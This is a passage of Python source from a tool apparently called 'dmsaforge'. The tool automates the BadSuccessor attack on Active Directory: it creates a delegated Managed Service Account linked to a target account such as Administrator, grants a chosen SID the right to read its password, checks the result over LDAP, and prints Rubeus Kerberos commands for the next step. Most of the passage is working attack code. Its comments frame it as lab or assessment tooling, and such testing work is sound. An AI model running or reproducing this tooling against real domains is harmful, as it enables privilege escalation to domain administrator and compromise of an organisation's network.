        if left is None or right is None:
            return False
        if validate_dn_syntax(left) and validate_dn_syntax(right):
            return normalize_dn(left) == normalize_dn(right)
        return str(left).strip().lower() == str(right).strip().lower()

    def _normalize_sid(self, sid):
        return str(sid).strip().upper() if sid else None

    def _mask_rights(self, mask):
        rights = [
            (0x10000000, 'GenericAll'),
            (0x40000000, 'GenericWrite'),
            (0x80000000, 'GenericRead'),
            (0x20000000, 'GenericExecute'),
            (0x00000001, 'CreateChild'),
            (0x00000002, 'DeleteChild'),
            (0x00000004, 'ListContents'),
            (0x00000008, 'SelfWrite'),
            (0x00000010, 'ReadProperty'),
            (0x00000020, 'WriteProperty'),
            (0x00000040, 'DeleteTree'),
            (0x00000080, 'ListObject'),
            (0x00000100, 'ControlAccess'),
            (0x00010000, 'Delete'),
            (0x00020000, 'ReadControl'),
            (0x00040000, 'WriteDACL'),
            (0x00080000, 'WriteOwner'),
            (0x00100000, 'Synchronize'),
        ]
        names = [name for bit, name in rights if mask & bit]
        return ','.join(names) if names else '0'

    def _parse_security_descriptor(self, sd_data):
        if sd_data in (None, b'', ''):
            return None, None, 'missing'

        if isinstance(sd_data, str):
            return None, None, 'present, but value is text; expected binary security descriptor'

        try:
            raw = bytes(sd_data)
        except Exception as e:
            return None, None, 'present, but could not convert to bytes: %s' % e

        if not raw:
            return None, raw, 'missing'

        try:
            return ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw), raw, None
        except Exception as e:
            return None, raw, 'decode failed: %s' % e

    def _security_descriptor_contains_sid(self, sd_data, expected_sid):
        expected_sid = self._normalize_sid(expected_sid)
        if not expected_sid:
            return False

        sd, _, error = self._parse_security_descriptor(sd_data)
        if error:
            return False

        candidate_sids = []
        for field in ('OwnerSid', 'GroupSid'):
            try:
                value = sd[field]
                if value:
                    candidate_sids.append(value.formatCanonical())
            except Exception:
                pass

        try:
            dacl = sd['Dacl']
            aces = getattr(dacl, 'aces', []) if dacl else []
            for ace in aces:
                try:
                    candidate_sids.append(ace['Ace']['Sid'].formatCanonical())
                except Exception:
                    pass
        except Exception:
            pass

        normalized_candidates = [self._normalize_sid(sid) for sid in candidate_sids if sid]
        return expected_sid in normalized_candidates

    def _access_allowed_ace_types(self):
        ace_types = set()
        for class_name in ('ACCESS_ALLOWED_ACE', 'ACCESS_ALLOWED_OBJECT_ACE'):
            ace_class = getattr(ldaptypes, class_name, None)
            ace_type = getattr(ace_class, 'ACE_TYPE', None)
            if ace_type is not None:
                try:
                    ace_types.add(int(ace_type))
                except (TypeError, ValueError):
                    ace_types.add(ace_type)
        return ace_types

    def _ace_type_value(self, ace):
        try:
            value = ace['AceType']
            try:
                return int(value)
            except (TypeError, ValueError):
                return value
        except Exception:
            return None

    def _guid_to_string(self, value):
        if value in (None, b'', ''):
            return ''
        if isinstance(value, uuid.UUID):
            return str(value).lower()
        if isinstance(value, bytes):
            if len(value) == 16:
                try:
                    return str(uuid.UUID(bytes_le=value)).lower()
                except Exception:
                    pass
            try:
                value = value.decode('utf-8')
            except UnicodeDecodeError:
                return ''
        text = str(value).strip().strip('{}').lower()
        if re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', text):
            return text
        return ''

    def _ace_object_type_guid(self, ace_data):
        try:
            return self._guid_to_string(ace_data['ObjectType'])
        except Exception:
            return ''

    def _security_descriptor_summary_lines(self, sd_data):
        sd, raw, error = self._parse_security_descriptor(sd_data)
        if error:
            if raw:
                return ['present, %d bytes, %s' % (len(raw), error)]
            return [error]

        lines = ['present, %d bytes' % len(raw)]

        try:
            lines.append('owner=%s' % sd['OwnerSid'].formatCanonical())
        except Exception:
            pass

        dacl = sd['Dacl']
        aces = getattr(dacl, 'aces', []) if dacl else []
        lines.append('dacl_ace_count=%d' % len(aces))

        for idx, ace in enumerate(aces, 1):
            try:
                if ace['AceType'] == ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE:
                    ace_type = 'ALLOW'
                elif ace['AceType'] == ldaptypes.ACCESS_DENIED_ACE.ACE_TYPE:
                    ace_type = 'DENY'
                else:
                    ace_type = 'ACE_TYPE_%s' % ace['AceType']
                mask = int(ace['Ace']['Mask']['Mask'])
                sid = ace['Ace']['Sid'].formatCanonical()
                lines.append('ace%d=%s sid=%s mask=0x%08x rights=%s' % (idx, ace_type, sid, mask, self._mask_rights(mask)))
            except Exception as e:
                lines.append('ace%d=decode_failed: %s' % (idx, e))

        return lines

    def _display_security_descriptor_summary_lines(self, sd_data):
        return self._security_descriptor_summary_lines(sd_data)

    def _security_descriptor_contains_result(self, sd_data, expected_sid):
        if not expected_sid:
            return None
        if sd_data in (None, b'', ''):
            return False
        return self._security_descriptor_contains_sid(sd_data, expected_sid)

    def verify_dmsa_creation(self, ldap_connection, dmsa_dn, expected_sam, expected_dns, expected_target_dn,
                             expected_allowed_sid=None, attempts=3, delay=2):
        """Read the newly created dMSA back from the DC and verify the attributes
        that are required for the Kerberos dMSA step.  This prevents optimistic
        success messages when AddRequest succeeded only partially or DC-side
        replication/KDC visibility is not ready yet.
        """
        attributes = [
            'distinguishedName',
            'objectClass',
            'sAMAccountName',
            'dNSHostName',
            'msDS-DelegatedMSAState',
            'msDS-ManagedAccountPrecededByLink',
            'msDS-GroupMSAMembership',
        ]

        last_errors = []
        self._last_verification_errors = []
        self._last_verification_snapshot = {}
        for attempt in range(1, attempts + 1):
            success = ldap_connection.search(
                search_base=dmsa_dn,
                search_filter='(objectClass=msDS-DelegatedManagedServiceAccount)',
                search_scope=LDAP_BASE,
                attributes=attributes
            )

            if success and len(ldap_connection.entries) > 0:
                entry = ldap_connection.entries[0]
                sam = self._entry_value(entry, 'sAMAccountName')
                dns = self._entry_value(entry, 'dNSHostName')
                state = self._entry_value(entry, 'msDS-DelegatedMSAState')
                predecessor = self._entry_value(entry, 'msDS-ManagedAccountPrecededByLink')
                membership = self._entry_value(entry, 'msDS-GroupMSAMembership')
                membership_summary = self._display_security_descriptor_summary_lines(membership)
                membership_contains_expected = self._security_descriptor_contains_result(membership, expected_allowed_sid)
                self._last_verification_snapshot = {
                    'dn': self._display_dn(entry.entry_dn),
                    'sam': sam,
                    'dns': dns,
                    'state': state,
                    'state_label': format_dmsa_delegated_state(state),
                    'predecessor': self._display_dn(predecessor),
                    'membership_summary': membership_summary,
                    'membership_contains_expected_sid': membership_contains_expected,
                }

                errors = []
                if str(sam).lower() != str(expected_sam).lower():
                    errors.append('sAMAccountName expected %s but got %s' % (expected_sam, sam))
                if str(dns).lower() != str(expected_dns).lower():
                    errors.append('dNSHostName expected %s but got %s' % (expected_dns, dns))
                if str(state) != DMSA_EXPECTED_DELEGATED_STATE:
                    errors.append('msDS-DelegatedMSAState expected %s but got %s' % (
                        format_dmsa_delegated_state(DMSA_EXPECTED_DELEGATED_STATE),
                        format_dmsa_delegated_state(state),
                    ))
                if not self._dn_equal(predecessor, expected_target_dn):
                    errors.append('msDS-ManagedAccountPrecededByLink expected %s but got %s' % (self._display_dn(expected_target_dn), self._display_dn(predecessor)))
                if membership in (None, b'', ''):
                    errors.append('msDS-GroupMSAMembership is missing or empty')
                else:
                    _, _, sd_error = self._parse_security_descriptor(membership)
                    if sd_error:
                        errors.append('msDS-GroupMSAMembership is not a valid binary security descriptor: %s' % sd_error)
                    elif expected_allowed_sid and not membership_contains_expected:
                        errors.append('msDS-GroupMSAMembership does not contain principals-allowed SID %s' % expected_allowed_sid)

                if not errors:
                    logging.info('Post-add verification succeeded on attempt %d/%d.' % (attempt, attempts))
                    return True

                last_errors = errors
                logging.warning('Post-add verification attempt %d/%d failed: %s' % (attempt, attempts, '; '.join(errors)))
            else:
                last_errors = ['object was not readable after AddRequest: %s' % ldap_connection.result]
                logging.warning('Post-add verification attempt %d/%d failed: %s' % (attempt, attempts, last_errors[0]))

            if attempt < attempts:
                time.sleep(delay)

        logging.error('Post-add verification failed. The dMSA may be incomplete; do not continue to Rubeus until this is fixed.')
        for err in last_errors:
            logging.error('Verification error: %s' % err)
        self._last_verification_errors = list(last_errors)
        return False

    def add_dmsa(self, ldap_connection):
        try:
            if not self._dmsa_name:
                self._dmsa_name = self.generate_dmsa_name()

            if not self._target_ou:
                message = 'Target OU is required for dMSA creation. Use --ou.'
                logging.error(message)
                self._set_report_failure('missing_target_ou', message)
                return False

            dmsa_dn = 'CN=%s,%s' % (self._dmsa_name, self._target_ou)
            exists = self.check_account_exists(ldap_connection, dmsa_dn)
            if exists is None:
                message = 'Could not verify whether dMSA already exists; aborting add.'
                logging.error('%s %s' % (message, self._display_dn(dmsa_dn)))
                self._set_report_failure('pre_add_existence_check_failed', message, dmsa_dn=self._display_dn(dmsa_dn), ldap_result=ldap_connection.result)
                return False
            if exists:
                message = 'dMSA account already exists.'
                logging.error('%s %s' % (message, self._display_dn(dmsa_dn)))
                self._set_report_failure('dmsa_already_exists', message, dmsa_dn=self._display_dn(dmsa_dn))
                return False

            if not self._target_account:
                message = 'Target account is required for dMSA creation. Use --target-account with the account to be linked by msDS-ManagedAccountPrecededByLink.'
                logging.error(message)
                self._set_report_failure('missing_target_account', message)
                return False

            if not self._principals_allowed:
                message = 'Principals allowed is required for dMSA creation. Use --principals-allowed with the SID, DN, or name that should retrieve the managed password.'
                logging.error(message)
                self._set_report_failure('missing_principals_allowed', message)
                return False

            principals_allowed = self._principals_allowed
            target_account = self._target_account

            dns_hostname = self._effective_dns_hostname()

            if not validate_dns_hostname(dns_hostname):
                message = 'DNS hostname is invalid: %s' % dns_hostname
                logging.error(message)
                self._set_report_failure(
                    'invalid_dns_hostname',
                    message,
                    dmsa_name='%s$' % self._dmsa_name,
                    dns_hostname=dns_hostname,
                )
                return False

            attributes = {
                'objectClass': ['msDS-DelegatedManagedServiceAccount'],
                'cn': self._dmsa_name,
                'sAMAccountName': '%s$' % self._dmsa_name,
                'dNSHostName': dns_hostname,
                'userAccountControl': 4096,
                'msDS-ManagedPasswordInterval': 30,
                'msDS-DelegatedMSAState': 2,
                'msDS-SupportedEncryptionTypes': 28,
                'accountExpires': 9223372036854775807,
            }

            user_sid = self.resolve_principal_sid(ldap_connection, principals_allowed)
            if not user_sid:
                reason = getattr(self, '_last_principal_error', None)
                message = 'Principals allowed lookup was ambiguous.' if reason else 'Principals allowed account not found or has no objectSid.'
                logging.error('%s %s' % (message, self._display_principal(principals_allowed)))
                if reason:
                    logging.error('Use a full DN or SID for --principals-allowed. Detail: %s' % reason)
                else:
                    logging.error('Rerun with --principals-allowed S-1-... if you already know the SID.')
                self._set_report_failure(
                    'principals_allowed_ambiguous' if reason else 'principals_allowed_not_found',
                    message,
                    principals_allowed=self._display_principal(principals_allowed),
                    detail=reason or '',
                )
                return False

            logging.debug('Resolved principals-allowed %s to SID %s' % (self._display_principal(principals_allowed), self._display_sid(user_sid)))
            group_msa_membership = self.build_security_descriptor(user_sid)
            if not group_msa_membership:
                message = 'Failed to build msDS-GroupMSAMembership security descriptor.'
                logging.error('%s SID: %s' % (message, user_sid))
                self._set_report_failure('security_descriptor_build_failed', message, principals_allowed_sid=user_sid)
                return False

            target_dn = self.resolve_account_dn(ldap_connection, target_account)
            if target_dn:
                logging.debug('Resolved target account %s to %s' % (self._display_value(target_account), self._display_dn(target_dn)))
            else:
                reason = getattr(self, '_last_target_account_error', None)
                message = 'Target account lookup was ambiguous.' if reason else 'Target account not found.'
                logging.error('%s %s' % (message, self._display_value(target_account)))
                if reason:
                    logging.error('Use a full target account DN. Detail: %s' % reason)
                if str(target_account).lower() == 'administrator' and not self._allow_admin_fallback:
                    logging.error('Use a full DN for the built-in Administrator account if automatic DN candidates do not resolve it.')
                usage_hint = self._target_account_usage_hint(target_account)
                if usage_hint:
                    logging.error(usage_hint)
                self._set_report_failure('target_account_ambiguous' if reason else 'target_account_not_found', message, target_account=self._display_value(target_account), detail=reason or '')
                return False

            # v6: put the dMSA-specific attributes in the initial AddRequest.
            # In this lab the caller can create the dMSA child object, but a
            # post-create Modify on these attributes is denied.  Therefore the
            # important attributes must be present at creation time.
            attributes['msDS-GroupMSAMembership'] = group_msa_membership
            attributes['msDS-ManagedAccountPrecededByLink'] = target_dn

            # This helps the creator keep control of the object.  Some DCs may
            # reject writing nTSecurityDescriptor during add; if that happens,
            # the script retries without it, but never drops msDS-GroupMSAMembership.
            attributes_with_sd = dict(attributes)
            attributes_with_sd['nTSecurityDescriptor'] = group_msa_membership

            success = ldap_connection.add(dmsa_dn, attributes=attributes_with_sd)
            add_mode = 'with nTSecurityDescriptor'
            if not success:
                first_error = ldap_connection.result
                if self._ldap_result_is_already_exists(first_error):
                    logging.error('Object already exists: %s' % self._display_dn(dmsa_dn))
                    logging.error('Use dmsaforge verify ... to inspect it or dmsaforge delete ... before adding a new object.')
                    self._set_report_failure('dmsa_already_exists', 'Object already exists.', dmsa_dn=self._display_dn(dmsa_dn), ldap_result=first_error)
                    return False
                logging.info('nTSecurityDescriptor was not accepted in AddRequest; retrying without it.')
                logging.debug('nTSecurityDescriptor AddRequest result: %s' % first_error)
                logging.info('msDS-GroupMSAMembership remains in the AddRequest.')
                success = ldap_connection.add(dmsa_dn, attributes=attributes)
                add_mode = 'without nTSecurityDescriptor'

            if not success:
                if self._ldap_result_is_already_exists(ldap_connection.result):
                    logging.error('Object already exists: %s' % self._display_dn(dmsa_dn))
                    logging.error('Use dmsaforge verify ... to inspect it or dmsaforge delete ... before adding a new object.')
                    self._set_report_failure('dmsa_already_exists', 'Object already exists.', dmsa_dn=self._display_dn(dmsa_dn), ldap_result=ldap_connection.result)
                    return False
                if ldap_connection.result:
                    logging.error('LDAP add error: %s' % ldap_connection.result)
                self._set_report_failure('ldap_add_failed', 'LDAP AddRequest failed.', dmsa_dn=self._display_dn(dmsa_dn), ldap_result=ldap_connection.result)
                return False

            logging.info('LDAP AddRequest succeeded %s. Verifying the object from the DC...' % add_mode)

            verified = self.verify_dmsa_creation(
                ldap_connection=ldap_connection,
                dmsa_dn=dmsa_dn,
                expected_sam='%s$' % self._dmsa_name,
                expected_dns=attributes.get('dNSHostName'),
                expected_target_dn=target_dn,
                expected_allowed_sid=user_sid,
                attempts=self._verify_attempts,
                delay=self._verify_delay
            )

            log_section('Findings')
            verification_snapshot = getattr(self, '_last_verification_snapshot', {}) or {}
            membership_summary = verification_snapshot.get('membership_summary') or self._display_security_descriptor_summary_lines(group_msa_membership)
            membership_status = membership_summary[0] if membership_summary else 'present'
            if verified:
                membership_status = '%s, verified' % membership_status
            else:
                membership_status = '%s, NOT VERIFIED' % membership_status
            log_kv("dMSA Name:", '%s$' % self._dmsa_name, width=30)
            log_kv("dMSA DN:", self._display_dn(dmsa_dn), width=30)
            log_kv("Target Account:", self._display_value(target_account), width=30)
            logging.info('BadSuccessor attributes:')
            log_kv("  objectClass:", 'msDS-DelegatedManagedServiceAccount', width=35)
            log_kv("  sAMAccountName:", verification_snapshot.get('sam') or attributes.get('sAMAccountName'), width=35)
            log_kv("  dNSHostName:", verification_snapshot.get('dns') or attributes.get('dNSHostName', 'Unknown'), width=35)
            log_kv("  msDS-DelegatedMSAState:", verification_snapshot.get('state_label') or format_dmsa_delegated_state(attributes.get('msDS-DelegatedMSAState')), width=35)
            log_kv("  msDS-ManagedAccountPrecededByLink:", verification_snapshot.get('predecessor') or self._display_dn(target_dn), width=35)
            log_kv("  msDS-GroupMSAMembership:", membership_status, width=35)
            for line in membership_summary[1:]:
                log_kv('', line, width=35)
            log_kv("  reader SID:", user_sid, width=35)
            log_kv("  nTSecurityDescriptor:", 'accepted in AddRequest' if add_mode == 'with nTSecurityDescriptor' else 'not accepted in AddRequest; object created without it', width=35)
            logging.info("LDAP Post-add Verification: %s" % ("SUCCESS" if verified else "FAILED"))
            if verified:
                logging.info("KDC Readiness: NOT VERIFIED by this script")
                if self._kdc_wait and self._kdc_wait > 0:
                    logging.info('Waiting %d seconds before Kerberos dMSA requests...' % self._kdc_wait)
                    logging.info('This does not verify KDC readiness.')
                    time.sleep(self._kdc_wait)
                kerberos_guidance = []
                if self._kerberos_guidance:
                    kerberos_guidance = self.print_rubeus_guidance()
                else:
                    logging.info('External Kerberos commands are listed in Next steps.')
            else:
                kerberos_guidance = []
            self._set_report_result(
                dmsa_name='%s$' % self._dmsa_name,
                dmsa_dn=self._display_dn(dmsa_dn),
                dns_hostname=attributes.get('dNSHostName', 'Unknown'),
                principals_allowed=self._display_value(principals_allowed),
                principals_allowed_sid=user_sid,
                target_account=self._display_value(target_account),
                target_dn=self._display_dn(target_dn),
                badsuccessor_attributes={
                    'objectClass': 'msDS-DelegatedManagedServiceAccount',
                    'sAMAccountName': verification_snapshot.get('sam') or attributes.get('sAMAccountName'),
                    'dNSHostName': verification_snapshot.get('dns') or attributes.get('dNSHostName', 'Unknown'),
                    'msDS-DelegatedMSAState': verification_snapshot.get('state') or attributes.get('msDS-DelegatedMSAState'),
                    'msDS-DelegatedMSAState_label': verification_snapshot.get('state_label') or format_dmsa_delegated_state(attributes.get('msDS-DelegatedMSAState')),
                    'msDS-ManagedAccountPrecededByLink': verification_snapshot.get('predecessor') or self._display_dn(target_dn),
                    'msDS-GroupMSAMembership': {
                        'reader_sid': user_sid,
                        'verified': bool(verified),
                        'summary': membership_summary,
                    },
                    'nTSecurityDescriptor': 'accepted in AddRequest' if add_mode == 'with nTSecurityDescriptor' else 'not accepted in AddRequest; object created without it',
                },
                add_request='SUCCESS' if success else 'FAILED',
                post_add_verification='SUCCESS' if verified else 'FAILED',
                verification_errors=[] if verified else getattr(self, '_last_verification_errors', []),
                msa_state=attributes.get('msDS-DelegatedMSAState'),
                msa_state_label=format_dmsa_delegated_state(attributes.get('msDS-DelegatedMSAState')),
                kerberos_guidance=kerberos_guidance,
            )
            return verified

        except Exception as e:
            message = 'dMSA creation failed: %s' % str(e)
            logging.error(message)
            self._set_report_failure('add_exception', message)
            return False

    def print_rubeus_guidance(self):
        lines = kerberos_guidance_lines(
            domain=self._domain,
            username=self._username,
            password=self._password,
            dmsa_name=self._dmsa_name,
            dc_host=self._target,
            dc_ip=self._target_ip,
        )

        log_section('Kerberos commands')
        for line in lines:
            logging.info(line)
        return lines

    def verify_dmsa(self, ldap_connection):
        try:
            if not self._dmsa_name:
                message = 'dMSA name is required for verification. Use --dmsa-name.'
                logging.error(message)
                self._set_report_failure('missing_dmsa_name', message)
                return False

            if not self._target_ou:
                message = 'Target OU is required for dMSA verification. Use --ou.'
                logging.error(message)
                self._set_report_failure('missing_target_ou', message)
                return False

            dmsa_dn = 'CN=%s,%s' % (self._dmsa_name, self._target_ou)
            attributes = [
                'distinguishedName',
                'objectClass',
                'sAMAccountName',
                'dNSHostName',
                'msDS-DelegatedMSAState',
                'msDS-ManagedAccountPrecededByLink',
                'msDS-GroupMSAMembership',
            ]

            success = ldap_connection.search(
                search_base=dmsa_dn,
                search_filter='(objectClass=*)',
                search_scope=LDAP_BASE,
                attributes=attributes
            )

            if not success or len(ldap_connection.entries) == 0:
                message = 'dMSA object not found or cannot be read.'
                logging.error('%s %s' % (message, self._display_dn(dmsa_dn)))
                if getattr(ldap_connection, 'result', None):
                    logging.error('LDAP error: %s' % ldap_connection.result)
                self._set_report_failure('dmsa_not_readable', message, dmsa_dn=self._display_dn(dmsa_dn), ldap_result=getattr(ldap_connection, 'result', None))
                return False

            entry = ldap_connection.entries[0]
            sam = self._entry_value(entry, 'sAMAccountName')
            dns = self._entry_value(entry, 'dNSHostName')
            state = self._entry_value(entry, 'msDS-DelegatedMSAState')
            predecessor = self._entry_value(entry, 'msDS-ManagedAccountPrecededByLink')
            membership = self._entry_value(entry, 'msDS-GroupMSAMembership')
            expected_sid = None
            if self._principals_allowed:
                expected_sid = self.resolve_principal_sid(ldap_connection, self._principals_allowed)
                if not expected_sid:
                    reason = getattr(self, '_last_principal_error', None)
                    message = 'Principals allowed lookup was ambiguous.' if reason else 'Could not resolve principals-allowed for SID validation.'
                    logging.error('%s %s' % (message, self._display_principal(self._principals_allowed)))
                    if reason:
                        logging.error('Use a full DN or SID for --principals-allowed. Detail: %s' % reason)
                    self._set_report_failure(
                        'principals_allowed_ambiguous' if reason else 'principals_allowed_not_found',
                        message,
                        principals_allowed=self._display_principal(self._principals_allowed),
                        detail=reason or '',
                    )
                    return False

            log_section('Findings')
            log_kv('dMSA DN:', self._display_dn(entry.entry_dn), width=30)
            logging.info('BadSuccessor attributes:')
            log_kv('  objectClass:', 'msDS-DelegatedManagedServiceAccount', width=35)
            log_kv('  sAMAccountName:', sam, width=35)
            log_kv('  dNSHostName:', dns, width=35)
            log_kv('  msDS-DelegatedMSAState:', format_dmsa_delegated_state(state), width=35)
            log_kv('  msDS-ManagedAccountPrecededByLink:', self._display_dn(predecessor), width=35)

            membership_lines = self._display_security_descriptor_summary_lines(membership) or ['missing']
            log_kv('  msDS-GroupMSAMembership:', membership_lines[0], width=35)
            for line in membership_lines[1:]:
                log_kv('', line, width=35)

            errors = []
            warnings = []
            expected_reader_sid_present = None
            if str(sam).lower() != ('%s$' % self._dmsa_name).lower():
                errors.append('sAMAccountName does not match %s$' % self._dmsa_name)
            if str(state) != DMSA_EXPECTED_DELEGATED_STATE:
                errors.append('msDS-DelegatedMSAState is not %s' % format_dmsa_delegated_state(DMSA_EXPECTED_DELEGATED_STATE))
            if not predecessor:
                errors.append('msDS-ManagedAccountPrecededByLink is missing')
            if membership in (None, b'', ''):
                errors.append('msDS-GroupMSAMembership is missing')
            else:
                _, _, sd_error = self._parse_security_descriptor(membership)
                if sd_error:
                    errors.append('msDS-GroupMSAMembership is not a valid binary security descriptor: %s' % sd_error)
                elif expected_sid:
                    if self._security_descriptor_contains_sid(membership, expected_sid):
                        expected_reader_sid_present = True
                        log_kv('  expected reader SID:', '%s present' % expected_sid, width=35)
                    else:
                        expected_reader_sid_present = False
                        message = 'expected reader SID %s is not present in msDS-GroupMSAMembership' % expected_sid
                        warnings.append(message)
                        log_kv('  expected reader SID:', '%s not present' % expected_sid, width=35)

            if errors:
                logging.error('Verification FAILED: %s' % '; '.join(errors))
                self._set_report_result(
                    dmsa_name='%s$' % self._dmsa_name,
                    dmsa_dn=self._display_dn(dmsa_dn),
                    verification='FAILED',
                    errors=errors,
                    warnings=warnings,
                )
                return False

            if warnings:
                logging.warning('Verification warning: %s' % '; '.join(warnings))
            verification_label = 'SUCCESS_WITH_WARNINGS' if warnings else 'SUCCESS'
            log_kv('Verification:', verification_label, width=30)
            kerberos_guidance = self.print_rubeus_guidance() if self._kerberos_guidance else []
            self._set_report_result(
                dmsa_name='%s$' % self._dmsa_name,
                dmsa_dn=self._display_dn(dmsa_dn),
                sam_account_name=sam,
                dns_hostname=dns,
                target_dn=self._display_dn(predecessor),
                msa_state=state,
                msa_state_label=format_dmsa_delegated_state(state),
                membership_summary=membership_lines,
                badsuccessor_attributes={
                    'objectClass': 'msDS-DelegatedManagedServiceAccount',
                    'sAMAccountName': sam,
                    'dNSHostName': dns,
                    'msDS-DelegatedMSAState': state,
                    'msDS-DelegatedMSAState_label': format_dmsa_delegated_state(state),
                    'msDS-ManagedAccountPrecededByLink': self._display_dn(predecessor),
                    'msDS-GroupMSAMembership': {
                        'expected_reader_sid': expected_sid or '',
                        'expected_reader_sid_present': expected_reader_sid_present,
                        'summary': membership_lines,
                    },
                },
                expected_reader_sid=expected_sid or '',
                warnings=warnings,
                verification=verification_label,
                kerberos_guidance=kerberos_guidance,
            )
            return True

        except Exception as e:
            message = 'dMSA verification failed: %s' % str(e)
            logging.error(message)
            self._set_report_failure('verify_exception', message)
            return False


CLI_DEFAULTS = {
    'account': '',
    'action': 'assess',
    'aes_key': None,
    'allow_admin_fallback': False,
    'base_dn': None,
    'dc_host': None,
    'dc_ip': None,
    'debug': False,
    'dmsa_name': None,
    'dns_hostname': None,
    'dry_run': False,
    'force': False,
    'hashes': None,
    'include_sd': False,
    'json': False,
    'k': False,
    'kdc_wait': 0,
    'kerberos_guidance': False,
    'low_noise': False,
    'method': 'LDAP',
    'method_supplied': False,
    'minimal': False,
    'next_step_prefix': None,
    'no_banner': False,
    'no_pass': False,
    'operation_id': None,
    'output': None,
    'output_only': False,
    'port': None,
    'port_supplied': False,
    'principals_allowed': None,
    'profile': None,
    'quiet': False,
    'redact': True,
    'resolve_names': False,
    'scope_base_dn': None,
    'scope_domain': None,
    'search_summary': False,
    'skip_dc_prereq': False,
    'target_account': None,
    'target_ou': None,
    'timeout': DEFAULT_LDAP_TIMEOUT,
    'ts': False,
    'update_source': DEFAULT_UPDATE_SOURCE,
    'verify_attempts': DEFAULT_VERIFY_ATTEMPTS,
    'verify_delay': DEFAULT_VERIFY_DELAY,
    'base_dn_supplied': False,
    'scope_domain_supplied': False,
    'scope_base_dn_supplied': False,
    'dc_host_supplied': False,
    'dc_ip_supplied': False,
    'dns_hostname_supplied': False,
}

def print_startup_banner():
    print('%s %s - by %s' % (TOOL_NAME, TOOL_VERSION, MODIFICATIONS_BY), flush=True)
    print(TOOL_DESCRIPTION, flush=True)
    print('', flush=True)
    print(ASCII_BANNER.strip('\n'), flush=True)
    print(PROJECT_URL, flush=True)
    print('Email: 888256@gmail.com', flush=True)
    print('', flush=True)


def terminal_is_interactive():
    return bool(getattr(sys.stdout, 'isatty', lambda: False)())


def should_show_banner(options=None):
    if options is not None:
        if getattr(options, 'no_banner', False) or getattr(options, 'quiet', False):
            return False
        if getattr(options, 'json', False) or getattr(options, 'output_only', False):
            return False
    return terminal_is_interactive()


def print_completion_hint(shell=None):
    print('')
    print('Use "dmsaforge ACTION -h" for action-specific options.')


def print_action_help_header():
    print('%s %s - by %s' % (TOOL_NAME, TOOL_VERSION, MODIFICATIONS_BY))
    print('')


def print_parser_help_with_hint(parser, shell=None, no_banner=False):
    if not no_banner and should_show_banner():
        print_startup_banner()
    parser.print_help()
    print_completion_hint(shell)
    sys.stdout.flush()


def print_action_help(action, no_banner=False):
    if not no_banner:
        print_action_help_header()
    parser = build_action_help_parser(action)
    parser.print_help()
    sys.stdout.flush()


def print_plan_help():
    print_action_help_header()
    print('usage: dmsaforge plan ACTION [domain/]username[:password] [options]')
    print('')
    print('main:')
    print('  ACTION       Action to preview: assess, add, verify, or delete.')
    print('  options      Pass the selected action options after ACTION.')
    print('')
    print('Plan is equivalent to "dmsaforge ACTION ... --dry-run"; it validates local inputs and prints planned LDAP operations without opening an LDAP connection.')
    print('')
    print('More information: %s    Email: 888256@gmail.com' % PROJECT_URL)


def add_update_options(parser):
    parser.add_argument('--dry-run', action='store_true', help='Print the pip command without running it.')
    parser.add_argument('--source', dest='update_source', default=DEFAULT_UPDATE_SOURCE, metavar='PIP_SPEC', help='pip install source. Default: %(default)s')
    parser.add_argument('--force', action='store_true', help='Run pip even when the version check matches or cannot be completed.')
    parser.add_argument('--quiet', action='store_true', help='Pass -q to pip and reduce local output.')
    return parser


def build_update_help_parser():
    parser = argparse.ArgumentParser(
        prog='%s update' % TOOL_NAME,
        description=UPDATE_HELP,
        epilog='More information: %s    Email: 888256@gmail.com' % PROJECT_URL,
        formatter_class=WideHelpFormatter,
    )
    add_update_options(parser)
    return parser


def print_update_help():
    print_action_help_header()
    build_update_help_parser().print_help()
    sys.stdout.flush()


def apply_option_defaults(options):
    for name, value in CLI_DEFAULTS.items():
        if not hasattr(options, name):
            setattr(options, name, value)


def option_supplied(argv, aliases):
    aliases = tuple(aliases)
    for arg in argv:
        for alias in aliases:
            if arg == alias or arg.startswith(alias + '='):
                return True
    return False


def find_single_dash_long_option(argv):
    for arg in argv:
        if not arg.startswith('-') or arg.startswith('--') or arg == '-':
            continue
        if len(arg) > 2:
            return arg.split('=', 1)[0]
    return None


def mark_supplied_options(options, argv):
    for attr in (
        'base_dn',
        'scope_domain',
        'scope_base_dn',
        'method',
        'port',
        'dc_host',
        'dc_ip',
        'dmsa_name',
        'dns_hostname',
        'target_account',
        'timeout',
    ):
        setattr(options, '%s_supplied' % attr, option_supplied(argv, OPTION_ALIASES[attr]))


def apply_profile(parser, options, argv):
    if not options.profile:
        return

    profile = str(options.profile).strip().lower()
    if profile not in PROFILE_CHOICES:
        parser.error('--profile must be one of: %s' % ', '.join(PROFILE_CHOICES))
    options.profile = profile

    if profile == 'safe':
        if not option_supplied(argv, OPTION_ALIASES['dry_run']):
            options.dry_run = True
        if not option_supplied(argv, OPTION_ALIASES['redact']):
            options.redact = True
        if (
            not options.scope_domain
            and not options.scope_base_dn
            and options.account
        ):
            account_domain = domain_from_account_hint(options.account)
            if account_domain and validate_domain_name(account_domain):
                options.scope_domain = account_domain.lower()
    elif profile == 'report':
        if not option_supplied(argv, OPTION_ALIASES['json']):
            options.json = True
        if not option_supplied(argv, OPTION_ALIASES['no_banner']):
            options.no_banner = True
    elif profile == 'ci':
        if not option_supplied(argv, OPTION_ALIASES['json']):
            options.json = True
        if not option_supplied(argv, OPTION_ALIASES['quiet']):
            options.quiet = True
        if not option_supplied(argv, OPTION_ALIASES['no_banner']):
            options.no_banner = True


def non_negative_int(value):
    try:
        parsed = int(value)
    except ValueError:
        raise argparse.ArgumentTypeError('must be an integer')
    if parsed < 0:
        raise argparse.ArgumentTypeError('must be 0 or greater')
    return parsed


def non_negative_float(value):
    try:
        parsed = float(value)
    except ValueError:
        raise argparse.ArgumentTypeError('must be a number')
    if parsed < 0:
        raise argparse.ArgumentTypeError('must be 0 or greater')
    return parsed


def positive_float(value):
    try:
        parsed = float(value)
    except ValueError:
        raise argparse.ArgumentTypeError('must be a number')
    if parsed <= 0:
        raise argparse.ArgumentTypeError('must be greater than 0')
    return parsed


def connection_method(value):
    method = str(value).upper()
    if method not in ('LDAP', 'LDAPS'):
        raise argparse.ArgumentTypeError('must be LDAP or LDAPS')
    return method


def planned_inference_events(options):
    events = []

    def add(kind, status, detail):
